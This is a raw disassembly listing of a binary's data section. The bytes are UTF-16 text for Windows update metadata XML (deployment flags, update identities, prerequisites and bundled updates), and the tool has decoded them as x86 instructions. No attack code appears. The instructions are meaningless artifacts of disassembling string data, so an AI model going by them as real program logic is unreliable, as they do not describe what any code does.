  408fd3:	00 09                	add    %cl,(%ecx)
  408fd5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  408fd8:	49                   	dec    %ecx
  408fd9:	00 73 00             	add    %dh,0x0(%ebx)
  408fdc:	41                   	inc    %ecx
  408fdd:	00 73 00             	add    %dh,0x0(%ebx)
  408fe0:	73 00                	jae    0x408fe2
  408fe2:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  408fe8:	65 00 64 00 3e       	add    %ah,%gs:0x3e(%eax,%eax,1)
  408fed:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  408ff1:	00 75 00             	add    %dh,0x0(%ebp)
  408ff4:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  408ff8:	2f                   	das
  408ff9:	00 49 00             	add    %cl,0x0(%ecx)
  408ffc:	73 00                	jae    0x408ffe
  408ffe:	41                   	inc    %ecx
  408fff:	00 73 00             	add    %dh,0x0(%ebx)
  409002:	73 00                	jae    0x409004
  409004:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  40900a:	65 00 64 00 3e       	add    %ah,%gs:0x3e(%eax,%eax,1)
  40900f:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409015:	00 09                	add    %cl,(%ecx)
  409017:	00 09                	add    %cl,(%ecx)
  409019:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40901c:	4c                   	dec    %esp
  40901d:	00 61 00             	add    %ah,0x0(%ecx)
  409020:	73 00                	jae    0x409022
  409022:	74 00                	je     0x409024
  409024:	43                   	inc    %ebx
  409025:	00 68 00             	add    %ch,0x0(%eax)
  409028:	61                   	popa
  409029:	00 6e 00             	add    %ch,0x0(%esi)
  40902c:	67 00 65 00          	add    %ah,0x0(%di)
  409030:	54                   	push   %esp
  409031:	00 69 00             	add    %ch,0x0(%ecx)
  409034:	6d                   	insl   (%dx),%es:(%edi)
  409035:	00 65 00             	add    %ah,0x0(%ebp)
  409038:	3e 00 32             	add    %dh,%ds:(%edx)
  40903b:	00 30                	add    %dh,(%eax)
  40903d:	00 32                	add    %dh,(%edx)
  40903f:	00 30                	add    %dh,(%eax)
  409041:	00 2d 00 30 00 32    	add    %ch,0x32003000
  409047:	00 2d 00 32 00 39    	add    %ch,0x39003200
  40904d:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409050:	2f                   	das
  409051:	00 4c 00 61          	add    %cl,0x61(%eax,%eax,1)
  409055:	00 73 00             	add    %dh,0x0(%ebx)
  409058:	74 00                	je     0x40905a
  40905a:	43                   	inc    %ebx
  40905b:	00 68 00             	add    %ch,0x0(%eax)
  40905e:	61                   	popa
  40905f:	00 6e 00             	add    %ch,0x0(%esi)
  409062:	67 00 65 00          	add    %ah,0x0(%di)
  409066:	54                   	push   %esp
  409067:	00 69 00             	add    %ch,0x0(%ecx)
  40906a:	6d                   	insl   (%dx),%es:(%edi)
  40906b:	00 65 00             	add    %ah,0x0(%ebp)
  40906e:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  409075:	00 09                	add    %cl,(%ecx)
  409077:	00 09                	add    %cl,(%ecx)
  409079:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40907c:	41                   	inc    %ecx
  40907d:	00 75 00             	add    %dh,0x0(%ebp)
  409080:	74 00                	je     0x409082
  409082:	6f                   	outsl  %ds:(%esi),(%dx)
  409083:	00 53 00             	add    %dl,0x0(%ebx)
  409086:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  40908b:	00 63 00             	add    %ah,0x0(%ebx)
  40908e:	74 00                	je     0x409090
  409090:	3e 00 30             	add    %dh,%ds:(%eax)
  409093:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409096:	2f                   	das
  409097:	00 41 00             	add    %al,0x0(%ecx)
  40909a:	75 00                	jne    0x40909c
  40909c:	74 00                	je     0x40909e
  40909e:	6f                   	outsl  %ds:(%esi),(%dx)
  40909f:	00 53 00             	add    %dl,0x0(%ebx)
  4090a2:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  4090a7:	00 63 00             	add    %ah,0x0(%ebx)
  4090aa:	74 00                	je     0x4090ac
  4090ac:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  4090b3:	00 09                	add    %cl,(%ecx)
  4090b5:	00 09                	add    %cl,(%ecx)
  4090b7:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4090ba:	41                   	inc    %ecx
  4090bb:	00 75 00             	add    %dh,0x0(%ebp)
  4090be:	74 00                	je     0x4090c0
  4090c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090c1:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  4090c5:	00 77 00             	add    %dh,0x0(%edi)
  4090c8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090c9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4090cd:	00 61 00             	add    %ah,0x0(%ecx)
  4090d0:	64 00 3e             	add    %bh,%fs:(%esi)
  4090d3:	00 30                	add    %dh,(%eax)
  4090d5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4090d8:	2f                   	das
  4090d9:	00 41 00             	add    %al,0x0(%ecx)
  4090dc:	75 00                	jne    0x4090de
  4090de:	74 00                	je     0x4090e0
  4090e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4090e1:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  4090e5:	00 77 00             	add    %dh,0x0(%edi)
  4090e8:	6e                   	outsb  %ds:(%esi),(%dx)
  4090e9:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  4090ed:	00 61 00             	add    %ah,0x0(%ecx)
  4090f0:	64 00 3e             	add    %bh,%fs:(%esi)
  4090f3:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  4090f9:	00 09                	add    %cl,(%ecx)
  4090fb:	00 09                	add    %cl,(%ecx)
  4090fd:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409100:	53                   	push   %ebx
  409101:	00 75 00             	add    %dh,0x0(%ebp)
  409104:	70 00                	jo     0x409106
  409106:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40910a:	73 00                	jae    0x40910c
  40910c:	65 00 64 00 65       	add    %ah,%gs:0x65(%eax,%eax,1)
  409111:	00 6e 00             	add    %ch,0x0(%esi)
  409114:	63 00                	arpl   %eax,(%eax)
  409116:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40911a:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40911e:	61                   	popa
  40911f:	00 76 00             	add    %dh,0x0(%esi)
  409122:	69 00 6f 00 72 00    	imul   $0x72006f,(%eax),%eax
  409128:	3e 00 30             	add    %dh,%ds:(%eax)
  40912b:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40912e:	2f                   	das
  40912f:	00 53 00             	add    %dl,0x0(%ebx)
  409132:	75 00                	jne    0x409134
  409134:	70 00                	jo     0x409136
  409136:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40913a:	73 00                	jae    0x40913c
  40913c:	65 00 64 00 65       	add    %ah,%gs:0x65(%eax,%eax,1)
  409141:	00 6e 00             	add    %ch,0x0(%esi)
  409144:	63 00                	arpl   %eax,(%eax)
  409146:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40914a:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40914e:	61                   	popa
  40914f:	00 76 00             	add    %dh,0x0(%esi)
  409152:	69 00 6f 00 72 00    	imul   $0x72006f,(%eax),%eax
  409158:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  40915f:	00 09                	add    %cl,(%ecx)
  409161:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409164:	2f                   	das
  409165:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  409169:	00 70 00             	add    %dh,0x0(%eax)
  40916c:	6c                   	insb   (%dx),%es:(%edi)
  40916d:	00 6f 00             	add    %ch,0x0(%edi)
  409170:	79 00                	jns    0x409172
  409172:	6d                   	insl   (%dx),%es:(%edi)
  409173:	00 65 00             	add    %ah,0x0(%ebp)
  409176:	6e                   	outsb  %ds:(%esi),(%dx)
  409177:	00 74 00 3e          	add    %dh,0x3e(%eax,%eax,1)
  40917b:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409181:	00 09                	add    %cl,(%ecx)
  409183:	00 3c 00             	add    %bh,(%eax,%eax,1)
  409186:	49                   	dec    %ecx
  409187:	00 73 00             	add    %dh,0x0(%ebx)
  40918a:	4c                   	dec    %esp
  40918b:	00 65 00             	add    %ah,0x0(%ebp)
  40918e:	61                   	popa
  40918f:	00 66 00             	add    %ah,0x0(%esi)
  409192:	3e 00 74 00 72       	add    %dh,%ds:0x72(%eax,%eax,1)
  409197:	00 75 00             	add    %dh,0x0(%ebp)
  40919a:	65 00 3c 00          	add    %bh,%gs:(%eax,%eax,1)
  40919e:	2f                   	das
  40919f:	00 49 00             	add    %cl,0x0(%ecx)
  4091a2:	73 00                	jae    0x4091a4
  4091a4:	4c                   	dec    %esp
  4091a5:	00 65 00             	add    %ah,0x0(%ebp)
  4091a8:	61                   	popa
  4091a9:	00 66 00             	add    %ah,0x0(%esi)
  4091ac:	3e 00 0d 00 0a 00 09 	add    %cl,%ds:0x9000a00
  4091b3:	00 09                	add    %cl,(%ecx)
  4091b5:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4091b8:	58                   	pop    %eax
  4091b9:	00 6d 00             	add    %ch,0x0(%ebp)
  4091bc:	6c                   	insb   (%dx),%es:(%edi)
  4091bd:	00 3e                	add    %bh,(%esi)
  4091bf:	00 26                	add    %ah,(%esi)
  4091c1:	00 6c 00 74          	add    %ch,0x74(%eax,%eax,1)
  4091c5:	00 3b                	add    %bh,(%ebx)
  4091c7:	00 55 00             	add    %dl,0x0(%ebp)
  4091ca:	70 00                	jo     0x4091cc
  4091cc:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4091d0:	74 00                	je     0x4091d2
  4091d2:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4091d6:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4091da:	6e                   	outsb  %ds:(%esi),(%dx)
  4091db:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4091df:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4091e3:	00 20                	add    %ah,(%eax)
  4091e5:	00 55 00             	add    %dl,0x0(%ebp)
  4091e8:	70 00                	jo     0x4091ea
  4091ea:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4091ee:	74 00                	je     0x4091f0
  4091f0:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4091f4:	44                   	inc    %esp
  4091f5:	00 3d 00 22 00 7b    	add    %bh,0x7b002200
  4091fb:	00 32                	add    %dh,(%edx)
  4091fd:	00 7d 00             	add    %bh,0x0(%ebp)
  409200:	22 00                	and    (%eax),%al
  409202:	20 00                	and    %al,(%eax)
  409204:	52                   	push   %edx
  409205:	00 65 00             	add    %ah,0x0(%ebp)
  409208:	76 00                	jbe    0x40920a
  40920a:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409210:	6f                   	outsl  %ds:(%esi),(%dx)
  409211:	00 6e 00             	add    %ch,0x0(%esi)
  409214:	4e                   	dec    %esi
  409215:	00 75 00             	add    %dh,0x0(%ebp)
  409218:	6d                   	insl   (%dx),%es:(%edi)
  409219:	00 62 00             	add    %ah,0x0(%edx)
  40921c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409220:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  409225:	00 30                	add    %dh,(%eax)
  409227:	00 34 00             	add    %dh,(%eax,%eax,1)
  40922a:	22 00                	and    (%eax),%al
  40922c:	20 00                	and    %al,(%eax)
  40922e:	2f                   	das
  40922f:	00 26                	add    %ah,(%esi)
  409231:	00 67 00             	add    %ah,0x0(%edi)
  409234:	74 00                	je     0x409236
  409236:	3b 00                	cmp    (%eax),%eax
  409238:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40923d:	00 3b                	add    %bh,(%ebx)
  40923f:	00 50 00             	add    %dl,0x0(%eax)
  409242:	72 00                	jb     0x409244
  409244:	6f                   	outsl  %ds:(%esi),(%dx)
  409245:	00 70 00             	add    %dh,0x0(%eax)
  409248:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40924c:	74 00                	je     0x40924e
  40924e:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  409254:	20 00                	and    %al,(%eax)
  409256:	55                   	push   %ebp
  409257:	00 70 00             	add    %dh,0x0(%eax)
  40925a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40925e:	74 00                	je     0x409260
  409260:	65 00 54 00 79       	add    %dl,%gs:0x79(%eax,%eax,1)
  409265:	00 70 00             	add    %dh,0x0(%eax)
  409268:	65 00 3d 00 22 00 53 	add    %bh,%gs:0x53002200
  40926f:	00 6f 00             	add    %ch,0x0(%edi)
  409272:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  409277:	00 61 00             	add    %ah,0x0(%ecx)
  40927a:	72 00                	jb     0x40927c
  40927c:	65 00 22             	add    %ah,%gs:(%edx)
  40927f:	00 20                	add    %ah,(%eax)
  409281:	00 45 00             	add    %al,0x0(%ebp)
  409284:	78 00                	js     0x409286
  409286:	70 00                	jo     0x409288
  409288:	6c                   	insb   (%dx),%es:(%edi)
  409289:	00 69 00             	add    %ch,0x0(%ecx)
  40928c:	63 00                	arpl   %eax,(%eax)
  40928e:	69 00 74 00 6c 00    	imul   $0x6c0074,(%eax),%eax
  409294:	79 00                	jns    0x409296
  409296:	44                   	inc    %esp
  409297:	00 65 00             	add    %ah,0x0(%ebp)
  40929a:	70 00                	jo     0x40929c
  40929c:	6c                   	insb   (%dx),%es:(%edi)
  40929d:	00 6f 00             	add    %ch,0x0(%edi)
  4092a0:	79 00                	jns    0x4092a2
  4092a2:	61                   	popa
  4092a3:	00 62 00             	add    %ah,0x0(%edx)
  4092a6:	6c                   	insb   (%dx),%es:(%edi)
  4092a7:	00 65 00             	add    %ah,0x0(%ebp)
  4092aa:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  4092af:	00 72 00             	add    %dh,0x0(%edx)
  4092b2:	75 00                	jne    0x4092b4
  4092b4:	65 00 22             	add    %ah,%gs:(%edx)
  4092b7:	00 20                	add    %ah,(%eax)
  4092b9:	00 41 00             	add    %al,0x0(%ecx)
  4092bc:	75 00                	jne    0x4092be
  4092be:	74 00                	je     0x4092c0
  4092c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4092c1:	00 53 00             	add    %dl,0x0(%ebx)
  4092c4:	65 00 6c 00 65       	add    %ch,%gs:0x65(%eax,%eax,1)
  4092c9:	00 63 00             	add    %ah,0x0(%ebx)
  4092cc:	74 00                	je     0x4092ce
  4092ce:	4f                   	dec    %edi
  4092cf:	00 6e 00             	add    %ch,0x0(%esi)
  4092d2:	57                   	push   %edi
  4092d3:	00 65 00             	add    %ah,0x0(%ebp)
  4092d6:	62 00                	bound  %eax,(%eax)
  4092d8:	53                   	push   %ebx
  4092d9:	00 69 00             	add    %ch,0x0(%ecx)
  4092dc:	74 00                	je     0x4092de
  4092de:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  4092e2:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  4092e7:	00 72 00             	add    %dh,0x0(%edx)
  4092ea:	75 00                	jne    0x4092ec
  4092ec:	65 00 22             	add    %ah,%gs:(%edx)
  4092ef:	00 20                	add    %ah,(%eax)
  4092f1:	00 2f                	add    %ch,(%edi)
  4092f3:	00 26                	add    %ah,(%esi)
  4092f5:	00 67 00             	add    %ah,0x0(%edi)
  4092f8:	74 00                	je     0x4092fa
  4092fa:	3b 00                	cmp    (%eax),%eax
  4092fc:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409301:	00 3b                	add    %bh,(%ebx)
  409303:	00 52 00             	add    %dl,0x0(%edx)
  409306:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  40930b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40930f:	00 6f 00             	add    %ch,0x0(%edi)
  409312:	6e                   	outsb  %ds:(%esi),(%dx)
  409313:	00 73 00             	add    %dh,0x0(%ebx)
  409316:	68 00 69 00 70       	push   $0x70006900
  40931b:	00 73 00             	add    %dh,0x0(%ebx)
  40931e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409322:	74 00                	je     0x409324
  409324:	3b 00                	cmp    (%eax),%eax
  409326:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40932b:	00 3b                	add    %bh,(%ebx)
  40932d:	00 50 00             	add    %dl,0x0(%eax)
  409330:	72 00                	jb     0x409332
  409332:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409336:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40933a:	75 00                	jne    0x40933c
  40933c:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  409342:	74 00                	je     0x409344
  409344:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409348:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  40934c:	74 00                	je     0x40934e
  40934e:	3b 00                	cmp    (%eax),%eax
  409350:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409355:	00 3b                	add    %bh,(%ebx)
  409357:	00 41 00             	add    %al,0x0(%ecx)
  40935a:	74 00                	je     0x40935c
  40935c:	4c                   	dec    %esp
  40935d:	00 65 00             	add    %ah,0x0(%ebp)
  409360:	61                   	popa
  409361:	00 73 00             	add    %dh,0x0(%ebx)
  409364:	74 00                	je     0x409366
  409366:	4f                   	dec    %edi
  409367:	00 6e 00             	add    %ch,0x0(%esi)
  40936a:	65 00 20             	add    %ah,%gs:(%eax)
  40936d:	00 49 00             	add    %cl,0x0(%ecx)
  409370:	73 00                	jae    0x409372
  409372:	43                   	inc    %ebx
  409373:	00 61 00             	add    %ah,0x0(%ecx)
  409376:	74 00                	je     0x409378
  409378:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40937c:	6f                   	outsl  %ds:(%esi),(%dx)
  40937d:	00 72 00             	add    %dh,0x0(%edx)
  409380:	79 00                	jns    0x409382
  409382:	3d 00 22 00 74       	cmp    $0x74002200,%eax
  409387:	00 72 00             	add    %dh,0x0(%edx)
  40938a:	75 00                	jne    0x40938c
  40938c:	65 00 22             	add    %ah,%gs:(%edx)
  40938f:	00 26                	add    %ah,(%esi)
  409391:	00 67 00             	add    %ah,0x0(%edi)
  409394:	74 00                	je     0x409396
  409396:	3b 00                	cmp    (%eax),%eax
  409398:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40939d:	00 3b                	add    %bh,(%ebx)
  40939f:	00 55 00             	add    %dl,0x0(%ebp)
  4093a2:	70 00                	jo     0x4093a4
  4093a4:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4093a8:	74 00                	je     0x4093aa
  4093aa:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4093ae:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4093b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4093b3:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4093b7:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4093bb:	00 20                	add    %ah,(%eax)
  4093bd:	00 55 00             	add    %dl,0x0(%ebp)
  4093c0:	70 00                	jo     0x4093c2
  4093c2:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4093c6:	74 00                	je     0x4093c8
  4093c8:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4093cc:	44                   	inc    %esp
  4093cd:	00 3d 00 22 00 30    	add    %bh,0x30002200
  4093d3:	00 66 00             	add    %ah,0x0(%esi)
  4093d6:	61                   	popa
  4093d7:	00 31                	add    %dh,(%ecx)
  4093d9:	00 32                	add    %dh,(%edx)
  4093db:	00 30                	add    %dh,(%eax)
  4093dd:	00 31                	add    %dh,(%ecx)
  4093df:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  4093e3:	00 34 00             	add    %dh,(%eax,%eax,1)
  4093e6:	33 00                	xor    (%eax),%eax
  4093e8:	33 00                	xor    (%eax),%eax
  4093ea:	30 00                	xor    %al,(%eax)
  4093ec:	2d 00 34 00 66       	sub    $0x66003400,%eax
  4093f1:	00 61 00             	add    %ah,0x0(%ecx)
  4093f4:	38 00                	cmp    %al,(%eax)
  4093f6:	2d 00 38 00 61       	sub    $0x61003800,%eax
  4093fb:	00 65 00             	add    %ah,0x0(%ebp)
  4093fe:	39 00                	cmp    %eax,(%eax)
  409400:	2d 00 62 00 38       	sub    $0x38006200,%eax
  409405:	00 37                	add    %dh,(%edi)
  409407:	00 37                	add    %dh,(%edi)
  409409:	00 34 00             	add    %dh,(%eax,%eax,1)
  40940c:	37                   	aaa
  40940d:	00 33                	add    %dh,(%ebx)
  40940f:	00 62 00             	add    %ah,0x0(%edx)
  409412:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  409416:	34 00                	xor    $0x0,%al
  409418:	31 00                	xor    %eax,(%eax)
  40941a:	22 00                	and    (%eax),%al
  40941c:	20 00                	and    %al,(%eax)
  40941e:	2f                   	das
  40941f:	00 26                	add    %ah,(%esi)
  409421:	00 67 00             	add    %ah,0x0(%edi)
  409424:	74 00                	je     0x409426
  409426:	3b 00                	cmp    (%eax),%eax
  409428:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40942d:	00 3b                	add    %bh,(%ebx)
  40942f:	00 2f                	add    %ch,(%edi)
  409431:	00 41 00             	add    %al,0x0(%ecx)
  409434:	74 00                	je     0x409436
  409436:	4c                   	dec    %esp
  409437:	00 65 00             	add    %ah,0x0(%ebp)
  40943a:	61                   	popa
  40943b:	00 73 00             	add    %dh,0x0(%ebx)
  40943e:	74 00                	je     0x409440
  409440:	4f                   	dec    %edi
  409441:	00 6e 00             	add    %ch,0x0(%esi)
  409444:	65 00 26             	add    %ah,%gs:(%esi)
  409447:	00 67 00             	add    %ah,0x0(%edi)
  40944a:	74 00                	je     0x40944c
  40944c:	3b 00                	cmp    (%eax),%eax
  40944e:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409453:	00 3b                	add    %bh,(%ebx)
  409455:	00 2f                	add    %ch,(%edi)
  409457:	00 50 00             	add    %dl,0x0(%eax)
  40945a:	72 00                	jb     0x40945c
  40945c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409460:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  409464:	75 00                	jne    0x409466
  409466:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40946c:	74 00                	je     0x40946e
  40946e:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409472:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409476:	74 00                	je     0x409478
  409478:	3b 00                	cmp    (%eax),%eax
  40947a:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  40947f:	00 3b                	add    %bh,(%ebx)
  409481:	00 42 00             	add    %al,0x0(%edx)
  409484:	75 00                	jne    0x409486
  409486:	6e                   	outsb  %ds:(%esi),(%dx)
  409487:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40948b:	00 65 00             	add    %ah,0x0(%ebp)
  40948e:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409492:	70 00                	jo     0x409494
  409494:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409498:	74 00                	je     0x40949a
  40949a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40949e:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  4094a2:	74 00                	je     0x4094a4
  4094a4:	3b 00                	cmp    (%eax),%eax
  4094a6:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  4094ab:	00 3b                	add    %bh,(%ebx)
  4094ad:	00 55 00             	add    %dl,0x0(%ebp)
  4094b0:	70 00                	jo     0x4094b2
  4094b2:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4094b6:	74 00                	je     0x4094b8
  4094b8:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4094bc:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4094c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4094c1:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4094c5:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  4094c9:	00 20                	add    %ah,(%eax)
  4094cb:	00 55 00             	add    %dl,0x0(%ebp)
  4094ce:	70 00                	jo     0x4094d0
  4094d0:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4094d4:	74 00                	je     0x4094d6
  4094d6:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4094da:	44                   	inc    %esp
  4094db:	00 3d 00 22 00 7b    	add    %bh,0x7b002200
  4094e1:	00 33                	add    %dh,(%ebx)
  4094e3:	00 7d 00             	add    %bh,0x0(%ebp)
  4094e6:	22 00                	and    (%eax),%al
  4094e8:	20 00                	and    %al,(%eax)
  4094ea:	52                   	push   %edx
  4094eb:	00 65 00             	add    %ah,0x0(%ebp)
  4094ee:	76 00                	jbe    0x4094f0
  4094f0:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  4094f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4094f7:	00 6e 00             	add    %ch,0x0(%esi)
  4094fa:	4e                   	dec    %esi
  4094fb:	00 75 00             	add    %dh,0x0(%ebp)
  4094fe:	6d                   	insl   (%dx),%es:(%edi)
  4094ff:	00 62 00             	add    %ah,0x0(%edx)
  409502:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  409506:	3d 00 22 00 32       	cmp    $0x32002200,%eax
  40950b:	00 30                	add    %dh,(%eax)
  40950d:	00 34 00             	add    %dh,(%eax,%eax,1)
  409510:	22 00                	and    (%eax),%al
  409512:	20 00                	and    %al,(%eax)
  409514:	2f                   	das
  409515:	00 26                	add    %ah,(%esi)
  409517:	00 67 00             	add    %ah,0x0(%edi)
  40951a:	74 00                	je     0x40951c
  40951c:	3b 00                	cmp    (%eax),%eax
  40951e:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409523:	00 3b                	add    %bh,(%ebx)
  409525:	00 2f                	add    %ch,(%edi)
  409527:	00 42 00             	add    %al,0x0(%edx)
  40952a:	75 00                	jne    0x40952c
  40952c:	6e                   	outsb  %ds:(%esi),(%dx)
  40952d:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  409531:	00 65 00             	add    %ah,0x0(%ebp)
  409534:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  409538:	70 00                	jo     0x40953a
  40953a:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40953e:	74 00                	je     0x409540
  409540:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  409544:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409548:	74 00                	je     0x40954a
  40954a:	3b 00                	cmp    (%eax),%eax
  40954c:	26 00 6c 00 74       	add    %ch,%es:0x74(%eax,%eax,1)
  409551:	00 3b                	add    %bh,(%ebx)
  409553:	00 2f                	add    %ch,(%edi)
  409555:	00 52 00             	add    %dl,0x0(%edx)
  409558:	65 00 6c 00 61       	add    %ch,%gs:0x61(%eax,%eax,1)
  40955d:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  409561:	00 6f 00             	add    %ch,0x0(%edi)
  409564:	6e                   	outsb  %ds:(%esi),(%dx)
  409565:	00 73 00             	add    %dh,0x0(%ebx)
  409568:	68 00 69 00 70       	push   $0x70006900
  40956d:	00 73 00             	add    %dh,0x0(%ebx)
  409570:	26 00 67 00          	add    %ah,%es:0x0(%edi)
  409574:	74 00                	je     0x409576
  409576:	3b 00                	cmp    (%eax),%eax
  409578:	3c 00                	cmp    $0x0,%al
  40957a:	2f                   	das
  40957b:	00 58 00             	add    %bl,0x0(%eax)
  40957e:	6d                   	insl   (%dx),%es:(%edi)
  40957f:	00 6c 00 3e          	add    %ch,0x3e(%eax,%eax,1)
  409583:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  409589:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40958c:	2f                   	das
  40958d:	00 55 00             	add    %dl,0x0(%ebp)
  409590:	70 00                	jo     0x409592
  409592:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  409596:	74 00                	je     0x409598
  409598:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40959c:	6e                   	outsb  %ds:(%esi),(%dx)
  40959d:	00 66 00             	add    %ah,0x0(%esi)
  4095a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4095a1:	00 3e                	add    %bh,(%esi)
  4095a3:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  4095a9:	00 3c 00             	add    %bh,(%eax,%eax,1)
  4095ac:	55                   	push   %ebp
  4095ad:	00 70 00             	add    %dh,0x0(%eax)
  4095b0:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  4095b4:	74 00                	je     0x4095b6
  4095b6:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  4095ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4095bb:	00 66 00             	add    %ah,0x0(%esi)
  4095be:	6f                   	outsl  %ds:(%esi),(%dx)
  4095bf:	00 3e                	add    %bh,(%esi)
  4095c1:	00 0d 00 0a 00 09    	add    %cl,0x9000a00
  4095c7:	00 09                	add    %cl,(%ecx)
